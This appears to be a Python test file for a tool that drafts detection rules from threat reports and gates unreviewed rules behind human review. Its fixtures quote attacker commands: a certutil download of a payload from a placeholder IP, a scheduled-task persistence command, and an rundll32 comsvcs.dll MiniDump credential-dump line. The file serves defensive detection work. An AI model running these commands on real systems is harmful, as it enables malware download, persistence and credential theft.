"""CTI -> rule drafter: extraction, IOC stripping, validity and the human review gate."""
import yaml

from anvil.draft import behavioural_tokens, draft, extract_commands
from anvil.engine import compile_rule
from anvil.harness import evaluate
from anvil.lint import lint_rule
from anvil.models import Rule

REPORT = """
Threat report: FIN-X intrusion (T1105, T1053.005)

The actor downloaded a second stage with the built-in certificate utility:

    C:\\> certutil.exe -urlcache -split -f http://198.51.100.23/payload.bin C:\\Users\\Public\\p.exe

and persisted with a scheduled task:

    C:\\> schtasks /create /sc minute /mo 5 /tn Updater /tr C:\\Users\\Public\\p.exe

Later they ran Invoke-Mimikatz and Get-DomainUser from memory.
"""


def test_extract_commands_and_behavioural_tokens():
    cmds = extract_commands(REPORT)
    assert any(c.startswith("certutil.exe") for c in cmds)
    assert any(c.startswith("schtasks") for c in cmds)
    toks = behavioural_tokens(cmds[0])
    assert "-urlcache" in toks
    assert not any("198.51.100.23" in t for t in toks)   # IOCs are stripped


def test_drafts_are_valid_gated_rules():
    drafts = draft(REPORT, "FIN-X", "https://example.org/report")
    cats = [d.rule["logsource"]["category"] for d in drafts]
    assert "process_creation" in cats and "ps_script" in cats
    for d in drafts:
        rule = Rule.from_dict(yaml.safe_load(d.to_yaml()))
        assert rule.status == "experimental" and {"attack.t1105", "attack.t1053.005"} <= set(rule.tags)
        compile_rule(rule)                                   # parses and compiles
        codes = {f.code for f in lint_rule(rule, profile="sigma")}
        assert "A114" in codes                              # review gate: unreviewed drafts cannot ship
        if d.tp_fixtures:                                    # drafted rule fires on its own evidence
            rule.tests.true_positives = d.tp_fixtures
            assert evaluate(rule, []).tp_fired == len(d.tp_fixtures)
    reviewed = yaml.safe_load(drafts[0].to_yaml())
    reviewed["anvil"]["reviewed"] = True
    assert "A114" not in {f.code for f in lint_rule(Rule.from_dict(reviewed), profile="sigma")}


def test_keyword_baseline_backend():
    (d,) = draft(REPORT, "FIN-X", backend="keywords")
    assert d.rule["detection"]["condition"] == "keywords"
    assert "certutil.exe" in d.rule["detection"]["keywords"]


def test_prompt_verbs_do_not_eat_binary_names():
    text = "\n".join([
        r"    C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full",
        r"    C:\> cmdkey.exe /list",
        r"    C:\> runas.exe /user:x cmd",
        r"    C:\> cmd.exe /c whoami /priv",
        r"    C:\> run notepad.exe",
    ])
    cmds = extract_commands(text)
    for want in ("rundll32.exe", "cmdkey.exe", "runas.exe", "cmd.exe /c", "notepad.exe"):
        assert any(c.startswith(want) for c in cmds), (want, cmds)
